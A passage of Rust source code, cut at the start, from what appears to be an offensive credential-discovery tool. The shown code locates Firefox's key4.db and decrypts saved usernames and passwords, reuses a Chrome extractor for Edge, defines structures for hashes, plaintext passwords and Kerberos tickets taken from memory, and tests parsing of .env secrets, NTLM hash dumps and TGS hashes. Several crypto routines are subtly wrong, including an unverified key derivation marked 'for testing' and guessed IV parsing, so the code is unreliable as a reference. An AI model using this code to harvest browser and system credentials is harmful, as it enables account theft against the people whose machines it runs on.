                    let username = self.decrypt_firefox_field(enc_username, master_key.as_deref())
                        .unwrap_or_else(|| format!("[encrypted:{}]", &enc_username[..20.min(enc_username.len())]));

                    let password = self.decrypt_firefox_field(enc_password, master_key.as_deref())
                        .unwrap_or_else(|| format!("[encrypted:{}]", &enc_password[..20.min(enc_password.len())]));

                    credentials.push(BrowserCred {
                        url: hostname,
                        username,
                        password,
                    });
                }
            }
        }

        info!("Extracted {} Firefox credentials", credentials.len());
        Ok(credentials)
    }

    fn get_firefox_master_key(&self, key4_path: &Path) -> Option<Vec<u8>> {
        // key4.db is a SQLite database containing the master key encrypted with:
        // - Empty password (most common) or user-set master password
        // - The key is stored in the nssPrivate table

        if !key4_path.exists() {
            return None;
        }

        let db_bytes = std::fs::read(key4_path).ok()?;

        // Parse SQLite to find metaData and nssPrivate tables
        // Look for password-check and encrypted key entries

        // For empty master password, the key derivation uses:
        // PBKDF2(password="", salt=global_salt, iterations) -> AES key -> decrypt actual key

        // Search for global salt (typically 32 bytes after "password" text)
        if let Some(pos) = db_bytes.windows(8).position(|w| w == b"password") {
            let search_start = pos.saturating_sub(100);
            let search_end = (pos + 200).min(db_bytes.len());

            // Look for salt-like data (high entropy bytes)
            for i in search_start..search_end.saturating_sub(32) {
                let potential_salt = &db_bytes[i..i + 32];

                // Try decryption with empty password
                if let Some(key) = self.try_firefox_key_derivation(potential_salt, b"") {
                    return Some(key);
                }
            }
        }

        // Fallback: return None, meaning credentials will be marked as encrypted
        None
    }

    fn try_firefox_key_derivation(&self, salt: &[u8], password: &[u8]) -> Option<Vec<u8>> {
        use sha2::Sha256;
        use hmac::Hmac;
        use pbkdf2::pbkdf2;

        // Firefox uses PBKDF2-SHA256 with varying iterations
        let iterations = [1, 10000, 100000];

        for &iter_count in &iterations {
            let mut derived_key = [0u8; 32];
            if pbkdf2::<Hmac<Sha256>>(password, salt, iter_count, &mut derived_key).is_ok() {
                // Verify if this produces a valid key by checking decryption
                // For now, return the derived key for testing
                if iter_count == 1 && password.is_empty() {
                    // Most common case for empty password
                    return Some(derived_key.to_vec());
                }
            }
        }

        None
    }

    fn decrypt_firefox_field(&self, encrypted_b64: &str, master_key: Option<&[u8]>) -> Option<String> {
        // Firefox encrypted fields are base64-encoded ASN.1 structures
        // Format: SEQUENCE { OID (3DES-CBC), SEQUENCE { IV, encrypted_data } }

        let encrypted = base64::decode(encrypted_b64).ok()?;

        if encrypted.len() < 20 {
            return None;
        }

        // Parse ASN.1 structure to extract IV and ciphertext
        // Simplified parsing - look for common patterns
        let (iv, ciphertext) = self.parse_firefox_encrypted_field(&encrypted)?;

        if let Some(key) = master_key {
            // Try 3DES-CBC decryption (Firefox default)
            if let Some(plaintext) = self.decrypt_3des_cbc(key, &iv, &ciphertext) {
                if let Ok(s) = String::from_utf8(plaintext) {
                    // Remove PKCS7 padding
                    let trimmed = s.trim_end_matches(|c: char| c.is_control());
                    return Some(trimmed.to_string());
                }
            }

            // Try AES-256-CBC (newer Firefox versions)
            if let Some(plaintext) = self.decrypt_aes_cbc(key, &iv, &ciphertext) {
                if let Ok(s) = String::from_utf8(plaintext) {
                    let trimmed = s.trim_end_matches(|c: char| c.is_control());
                    return Some(trimmed.to_string());
                }
            }
        }

        None
    }

    fn parse_firefox_encrypted_field(&self, data: &[u8]) -> Option<(Vec<u8>, Vec<u8>)> {
        // ASN.1 DER parsing for Firefox encrypted fields
        // SEQUENCE { AlgorithmIdentifier, OCTET STRING (encrypted) }

        if data.len() < 10 || data[0] != 0x30 {
            return None;
        }

        // Skip outer SEQUENCE tag and length
        let mut pos = 2;
        if data[1] & 0x80 != 0 {
            pos += (data[1] & 0x7f) as usize;
        }

        // Skip AlgorithmIdentifier SEQUENCE
        if pos >= data.len() || data[pos] != 0x30 {
            return None;
        }
        pos += 1;
        let algo_len = data[pos] as usize;
        pos += 1 + algo_len;

        // Find the OCTET STRING containing encrypted data
        if pos >= data.len() {
            return None;
        }

        // Look for IV (typically 8 bytes for 3DES, 16 for AES)
        // Firefox stores IV in the AlgorithmIdentifier parameters
        let iv_len = if algo_len > 20 { 16 } else { 8 };
        let iv_start = pos.saturating_sub(iv_len);
        let iv = data.get(iv_start..pos)?.to_vec();

        // Rest is ciphertext
        if data[pos] == 0x04 {
            pos += 1;
            let cipher_len = if data[pos] & 0x80 != 0 {
                let len_bytes = (data[pos] & 0x7f) as usize;
                pos += 1;
                let mut len = 0usize;
                for &b in &data[pos..pos + len_bytes] {
                    len = (len << 8) | b as usize;
                }
                pos += len_bytes;
                len
            } else {
                let len = data[pos] as usize;
                pos += 1;
                len
            };

            let ciphertext = data.get(pos..pos + cipher_len)?.to_vec();
            return Some((iv, ciphertext));
        }

        None
    }

    fn decrypt_3des_cbc(&self, key: &[u8], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
        // 3DES CBC decryption with manual PKCS7 unpadding
        use des::TdesEde3;
        use des::cipher::{BlockDecrypt, KeyInit};

        if key.len() < 24 || iv.len() < 8 || ciphertext.len() % 8 != 0 {
            return None;
        }

        let key_arr: [u8; 24] = key[..24].try_into().ok()?;
        let mut iv_arr: [u8; 8] = iv[..8].try_into().ok()?;

        let cipher = TdesEde3::new(&key_arr.into());
        let mut buf = ciphertext.to_vec();

        // CBC decryption: for each block, decrypt then XOR with previous ciphertext (or IV)
        for chunk in buf.chunks_mut(8) {
            let prev_ct = iv_arr;
            iv_arr.copy_from_slice(chunk);
            cipher.decrypt_block(chunk.into());
            for (p, c) in chunk.iter_mut().zip(prev_ct.iter()) {
                *p ^= c;
            }
        }

        // Remove PKCS7 padding
        let padding_len = buf.last().copied().unwrap_or(0) as usize;
        if padding_len > 0 && padding_len <= 8 && buf.len() >= padding_len {
            buf.truncate(buf.len() - padding_len);
        }

        Some(buf)
    }

    fn decrypt_aes_cbc(&self, key: &[u8], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
        // AES-256 CBC decryption
        use aes::Aes256;
        use aes::cipher::{BlockDecrypt, KeyInit};

        if key.len() < 32 || iv.len() < 16 || ciphertext.len() % 16 != 0 {
            return None;
        }

        let key_arr: [u8; 32] = key[..32].try_into().ok()?;
        let mut iv_arr: [u8; 16] = iv[..16].try_into().ok()?;

        let cipher = Aes256::new(&key_arr.into());
        let mut buf = ciphertext.to_vec();

        // CBC decryption
        for chunk in buf.chunks_mut(16) {
            let prev_ct = iv_arr;
            iv_arr.copy_from_slice(chunk);
            cipher.decrypt_block(chunk.into());
            for (p, c) in chunk.iter_mut().zip(prev_ct.iter()) {
                *p ^= c;
            }
        }

        // Remove PKCS7 padding
        let padding_len = buf.last().copied().unwrap_or(0) as usize;
        if padding_len > 0 && padding_len <= 16 && buf.len() >= padding_len {
            buf.truncate(buf.len() - padding_len);
        }

        Some(buf)
    }

    fn extract_edge_credentials(&self, profile_path: &str) -> Result<Vec<BrowserCred>> {
        // Edge (Chromium) uses same format as Chrome
        debug!("Extracting Edge credentials from {}", profile_path);
        self.extract_chrome_credentials(profile_path)
    }
}

impl Default for CredentialDiscovery {
    fn default() -> Self {
        Self::new()
    }
}

// Helper types

#[derive(Debug)]
struct ExtractedCred {
    cred_type: CredentialType,
    username: String,
    domain: Option<String>,
    secret: CredentialSecret,
}

#[derive(Debug)]
struct MemoryHash {
    username: Option<String>,
    domain: Option<String>,
    hash: String,
    process: Option<String>,
}

#[derive(Debug)]
struct MemoryPlaintext {
    username: String,
    domain: Option<String>,
    password: String,
    process: Option<String>,
}

#[derive(Debug)]
struct MemoryTicket {
    is_tgt: bool,
    client: String,
    service: String,
    realm: String,
    key_type: i32,
    data: String,
    expires_at: Option<chrono::DateTime<Utc>>,
}

#[derive(Debug)]
struct BrowserCred {
    url: String,
    username: String,
    password: String,
}

/// Scan host for discovery input
#[derive(Debug)]
pub struct ScanHost {
    pub ip: String,
    pub hostname: Option<String>,
    pub services: Vec<ScanService>,
}

#[derive(Debug)]
pub struct ScanService {
    pub port: u16,
    pub name: String,
    pub banner: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_env_config() {
        let discovery = CredentialDiscovery::new();
        let content = r#"
DATABASE_URL=postgres://localhost/db
PASSWORD=secret123
API_KEY=sk-abc123xyz
DB_PASS=dbpassword
"#;

        let creds = discovery.parse_env_config(content);
        assert_eq!(creds.len(), 3);
    }

    #[test]
    fn test_parse_connection_string() {
        let discovery = CredentialDiscovery::new();
        let conn = "Server=localhost;Database=testdb;User Id=admin;Password=secret123;";

        let cred = discovery.parse_connection_string(conn);
        assert!(cred.is_some());

        let cred = cred.unwrap();
        assert_eq!(cred.username, "admin");
        match cred.secret {
            CredentialSecret::Plaintext(p) => assert_eq!(p, "secret123"),
            _ => panic!("Expected plaintext"),
        }
    }

    #[test]
    fn test_parse_hashes() {
        let mut discovery = CredentialDiscovery::new();
        let text = r#"
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
$krb5tgs$23$*user$DOMAIN$spn*$abc123...
"#;

        let count = discovery.parse_hashes(text, CredentialSource::Manual);
        assert!(count >= 2);
    }
}
